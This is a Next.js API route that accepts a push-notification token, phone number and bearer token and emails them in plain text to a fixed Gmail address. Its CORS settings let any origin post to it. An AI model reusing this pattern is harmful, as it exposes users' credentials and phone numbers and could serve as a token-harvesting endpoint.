
import { NextRequest, NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
}

export async function POST(req: NextRequest) {
  const body = await req.json();
  const { tokenCode, phone, isRegistered, dateRegistered, bearerToken } = body;

  if (!tokenCode || !phone || !dateRegistered || !bearerToken) {
    return NextResponse.json(
      { message: "Missing required fields" },
      { status: 400 }
    );
  }

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USERNAME,
        pass: process.env.EMAIL_PASSWORD,
      },
    });

    const mailOptions = {
      from: "ronan.ramos.sibunga@gmail.com",
      to: "ronan.sibunga@gmail.com",
      subject: "📲 FCM Token Submission",
      text: `
📲 FCM Token Code: ${tokenCode}
📞 Phone: ${phone}
🟢 Is Registered: ${isRegistered}
📅 Date Registered: ${dateRegistered}
🔐 Bearer Token: ${bearerToken}
      `,
    };

    await transporter.sendMail(mailOptions);

    console.log(`✅ FCM details sent via email.`);
    return NextResponse.json(
      { message: "FCM details emailed successfully" },
      { status: 200 }
    );
  } catch (error: unknown) {
  if (error instanceof Error) {
    console.error("❌ Failed to send email:", error);
    return NextResponse.json(
      { message: "Failed to send email", error: error.message },
      { status: 500 }
    );
  }

  console.error("❌ Unknown error occurred", error);
  return NextResponse.json(
    { message: "Failed to send email", error: "Unknown error" },
    { status: 500 }
  );
}
}
